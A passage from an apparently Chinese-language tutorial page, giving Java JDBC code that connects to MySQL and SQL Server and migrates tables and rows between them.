class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>    <span class="hljs-keyword">public</span> Connection conn;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/main/resources/config.properties&quot;</span>);<br>            p.load(inputStream);<br>            <span class="hljs-comment">// 从properties文件中获取属性</span><br>            driverName = p.getProperty(<span class="hljs-string">&quot;Mysql_driverName&quot;</span>);<br>            url = p.getProperty(<span class="hljs-string">&quot;Mysql_URL&quot;</span>);<br>            username = p.getProperty(<span class="hljs-string">&quot;Mysql_username&quot;</span>);<br>            password = p.getProperty(<span class="hljs-string">&quot;Mysql_password&quot;</span>);<br>            <span class="hljs-comment">// 加载驱动</span><br>            Class.forName(driverName);<br>            inputStream.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 数据库连接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;正在连接MySQL数据库&quot;</span>);<br>            <span class="hljs-built_in">this</span>.conn = DriverManager.getConnection(url, username, password);<br>            System.out.println(<span class="hljs-string">&quot;连接MySQL数据库成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;连接MySQL数据库失败&quot;</span>);<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取当前数据库连接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.conn;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 关闭数据库连接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) <span class="hljs-built_in">this</span>.conn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="连接SQL-Server数据库"><a href="#连接SQL-Server数据库" class="headerlink" title="连接SQL Server数据库"></a>连接SQL Server数据库</h4><p><strong>类</strong>：<code>SqlServerConnection</code></p><p>与连接MySQL基本一致，基于jdbc驱动使用用户名和密码进行连接。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlServerConnection</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String driverName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String url;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String password;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;src/main/resources/config.properties&quot;</span>);<br>            p.load(inputStream);<br>            <span class="hljs-comment">// 从properties文件中获取属性</span><br>            driverName = p.getProperty(<span class="hljs-string">&quot;SqlServer_driverName&quot;</span>);<br>            url = p.getProperty(<span class="hljs-string">&quot;SqlServer_URL&quot;</span>);<br>            username=p.getProperty(<span class="hljs-string">&quot;SqlServer_username&quot;</span>);<br>            password=p.getProperty((<span class="hljs-string">&quot;SqlServer_password&quot;</span>));<br>            <span class="hljs-comment">//加载驱动</span><br>            Class.forName(driverName);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 数据库连接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;正在连接SQLServer数据库&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.conn = DriverManager.getConnection(url,username,password);<br>            System.out.println(<span class="hljs-string">&quot;连接SQLServer数据库成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;连接SQLServer数据库失败&quot;</span>);<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取当前数据库连接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.conn;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 关闭数据库连接</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) <span class="hljs-built_in">this</span>.conn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="由-SQL-Server-转移数据至-MySQL"><a href="#由-SQL-Server-转移数据至-MySQL" class="headerlink" title="由 SQL Server 转移数据至 MySQL"></a>由 SQL Server 转移数据至 MySQL</h4><p><strong>类</strong>：<code>SqlServerToMysql</code></p><ul><li>public static void <code>setConnSQLserver(Connection connSQLserver)</code>：传参分别设置SQL Server的连接。</li><li>public static void <code>setConnMysql(Connection connMysql)</code>：传参分别设置MySQL的连接。</li><li><p>public static List&lt; String &gt; <code>getTable()</code>：对连接调用<code>getMetaData()</code>获取数据库的元数据<code>md</code>，对于<code>md</code>调用<code>getTables(null, &quot;dbo&quot;, null, null)</code>获得数据库中的<code>表信息</code>，若该表在使用者指定要转移的表中，则将表的信息存入list返回。</p></li><li><p>public static boolean <code>insertTable(String table,int size)</code>：使用<code>Preparedstatement</code>定义预处理对象，执行sql语句，完成<code>向Mysql数据库单个表插入元组</code>的操作。</p></li><li>public static void <code>convert()</code>：调用getTable()和insertTable(String table,int size)，也同样执行sql语句，遍历原表中所有字段来加入建表语句，以完成<code>在Mysql数据库中建表并转移数据</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlServerToMysql</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">Connection</span> <span class="hljs-variable">connSQLserver</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">Connection</span> <span class="hljs-variable">connMysql</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConnSQLserver</span><span class="hljs-params">(Connection connSQLserver)</span> &#123;<br>        <span class="hljs-comment">//设置连接</span><br>        SqlServerToMysql.connSQLserver = connSQLserver;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConnMysql</span><span class="hljs-params">(Connection connMysql)</span> &#123;<br>        <span class="hljs-comment">//设置连接</span><br>        SqlServerToMysql.connMysql = connMysql;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> PreparedStatement pstatSqlServer;<br>    <span class="hljs-keyword">static</span> PreparedStatement pstatMySql;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取SqlServer中的表</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">getTable</span><span class="hljs-params">(List&lt;String&gt; TableList)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;开始获取SqlServer数据库的表&quot;</span>);<br>        <span class="hljs-type">DatabaseMetaData</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取数据库元数据</span><br>            md = connSQLserver.getMetaData();<br>            <span class="hljs-comment">//查询获得表</span><br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> md.getTables(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;dbo&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">if</span> (rs != <span class="hljs-literal">null</span>) &#123;<br>                list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br>            &#125;<br>            <span class="hljs-comment">//往list添加查询到的表</span><br>            <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>                <span class="hljs-comment">// 存在需要转移的表 / 为空：转移所有表</span><br>                <span class="hljs-keyword">if</span>(TableList.contains(rs.getString(<span class="hljs-string">&quot;TABLE_NAME&quot;</span>))||TableList.isEmpty())<br>                    list.add(rs.getString(<span class="hljs-string">&quot;TABLE_NAME&quot;</span>));<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;成功获取SqlServer数据库的表&quot;</span>);<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 用于向Mysql数据库单个表插入元组</span><br><span class="hljs-comment">     * table  表名  size 字段个数</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">insertTable</span><span class="hljs-params">(String table,<span class="hljs-type">int</span> size)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            pstatSqlServer=connSQLserver.prepareStatement(<span class="hljs-string">&quot;select * from &quot;</span>+table);<br>            ResultSet rs=pstatSqlServer.executeQuery();<br>            <span class="hljs-comment">//分隔符</span><br>            String separator=<span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-comment">//插入元组的sql语句</span><br>            String insertSql=<span class="hljs-string">&quot;insert into &quot;</span>+table+<span class="hljs-string">&quot; values(&quot;</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                insertSql+=(separator+<span class="hljs-string">&quot;?&quot;</span>);<br>                separator=<span class="hljs-string">&quot;,&quot;</span>;<br>            &#125;<br>            insertSql+=<span class="hljs-string">&quot;)&quot;</span>;<br>            <span class="hljs-comment">//关闭自动提交，使插入字段的语句为一个事务组</span><br>            connMysql.setAutoCommit(<span class="hljs-literal">false</span>);<br>            <span class="hljs-comment">//定义预编译的sql语句对象</span><br>            pstatMySql=connMysql.prepareStatement(insertSql);<br><br>            <span class="hljs-keyword">while</span> (rs.next())&#123;<br>                <span class="hljs-comment">//将字段值填入insertSql语句</span><br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                    pstatMySql.setObject(i+<span class="hljs-number">1</span>,rs.getObject(i+<span class="hljs-number">1</span>));<br>                &#125;<br>                <span class="hljs-comment">//加入批处理队列</span><br>                pstatMySql.addBatch();<br>            &#125;<br>            <span class="hljs-comment">//批量更新sql语句</span><br>            pstatMySql.executeBatch();<br>            <span class="hljs-comment">//提交</span><br>            connMysql.commit();<br>            <span class="hljs-comment">//恢复自动提交</span><br>            connMysql.setAutoCommit(<span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 建表并转移数据</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">convert</span><span class="hljs-params">(List&lt;String&gt; TableList)</span>&#123;<br>        <span class="hljs-comment">//结果集元数据</span><br>        <span class="hljs-type">ResultSetMetaData</span> <span class="hljs-variable">rsmd</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//获取SqlServer数据库的所有表</span><br>        List&lt;String&gt; list=getTable(TableList);<br>        System.out.println(list.size());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; list.size(); i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;开始转移第&quot;</span> + (i + <span class="hljs-number">1</span> )+ <span class="hljs-string">&quot;数据表...&quot;</span>);<br>            <span class="hljs-comment">//查询表</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from &quot;</span> + list.get(i);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                pstatSqlServer = connSQLserver.prepareStatement(sql);<br>                <span class="hljs-comment">//获取数据表</span><br>                rsmd = pstatSqlServer.getMetaData();<br>                <span class="hljs-comment">//创建表的语句</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">createSql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;create table &quot;</span> + list.get(i) + <span class="hljs-string">&quot;(&quot;</span>;<br>                <span class="hljs-comment">//sql语句中字段名的分隔符</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">separator</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-comment">//遍历表中所有字段</span><br>                size = rsmd.getColumnCount();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; size; j++) &#123;<br>                    <span class="hljs-comment">//字段名 类型</span><br>                    createSql += separator + rsmd.getColumnName(j + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;  &quot;</span> + rsmd.getColumnTypeName(j + <span class="hljs-number">1</span>);<br>                    <span class="hljs-comment">//判断类型是否规定长度</span><br>                    <span class="hljs-keyword">if</span> (rsmd.getPrecision(j + <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-comment">//不为0则规定长度</span><br>                        createSql += <span class="hljs-string">&quot;(&quot;</span> + rsmd.getPrecision(j + <span class="hljs-number">1</span>) + <span class="hljs-string">&quot;)&quot;</span>;<br>                    &#125;<br>                    separator = <span class="hljs-string">&quot;,&quot;</span>;<br>                &#125;<br>                createSql += <span class="hljs-string">&quot;);&quot;</span>;<br>                <span class="hljs-comment">//执行建表语句</span><br>                pstatMySql=connMysql.prepareStatement(createSql);<br>                pstatMySql.execute();<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;开始向(&quot;</span> + list.get(i) + <span class="hljs-string">&quot;)数据表添加数据...&quot;</span>);<br>            <span class="hljs-comment">// 添加数据到建好的表中</span><br>            <span class="hljs-keyword">if</span> (insertTable( list.get(i), size))&#123;<br>                System.out.println(<span class="hljs-string">&quot;第&quot;</span> + (i + <span class="hljs-number">1</span> ) + <span class="hljs-string">&quot;个数据表数据转移成功&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;第&quot;</span> + (i + <span class="hljs-number">1</span> ) + <span class="hljs-string">&quot;个数据表数据转移失败&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="由-MySQL-转移数据至-SQL-Server"><a href="#由-MySQL-转移数据至-SQL-Server" class="headerlink" title="由 MySQL 转移数据至 SQL Server"></a>由 MySQL 转移数据至 SQL Server</h4><p><strong>类：</strong>MysqlToSqlServer</p><p>与SQL Server 转移数据至 MySQL 大同小异。不同之处在于：</p><ul><li>查询获得表的语句为：<code>ResultSet rs = md.getTables(null, null, null, new String[]&#123;&quot;TABLE&quot;&#125;)</code>,这要求在<code>创建jdbc连接的URL</code>后面接上<code>nullCatalogMeansCurrent=true</code>，<strong>否则</strong>会返回所有数据库表的信息，而不是指定的数据库的表。</li><li>判断字段类型是否规定长度，注意MySQL中默认INT类型长度为10，而SQL Server中为0，故对于INT型字段要添加过滤条件，往SQL Server数据库插入INT类型的数据时不得指定长度。</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MysqlToSqlServer</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">Connection</span> <span class="hljs-variable">connSQLserver</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">Connection</span> <span class="hljs-variable">connMysql</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConnSQLserver</span><span class="hljs-params">(Connection connSQLserver)</span> &#123;<br>        MysqlToSqlServer.connSQLserver = connSQLserver;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConnMysql</span><span class="hljs-params">(Connection connMysql)</span> &#123;<br>        MysqlToSqlServer.connMysql = connMysql;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> PreparedStatement pstatSqlServer;<br>    <span class="hljs-keyword">static</span> PreparedStatement pstatMySql;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取MySQL中的表</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">getTable</span><span class="hljs-params">(List&lt;String&gt; TableList)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;开始获取MySQL数据库的表&quot;</span>);<br>        <span class="hljs-type">DatabaseMetaData</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取数据库元数据</span><br>            md = connMysql.getMetaData();<br>            <span class="hljs-comment">//查询获得表</span><br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> md.getTables(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;TABLE&quot;</span>&#125;);<br>            <span class="hljs-keyword">if</span> (rs != <span class="hljs-literal">null</span>) &#123;<br>                list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br>            &#125;<br>            <span class="hljs-comment">//往list添加查询到的表</span><br>            <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>                <span class="hljs-comment">// 存在需要转移的表 / 为空：转移所有表</span><br>                <span class="hljs-keyword">if</span>(TableList.contains(rs.getString(<span class="hljs-string">&quot;TABLE_NAME&quot;</span>))||TableList.isEmpty())<br>                    list.add(rs.getString(<span class="hljs-string">&quot;TABLE_NAME&quot;</span>));<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        System.out.println(<span 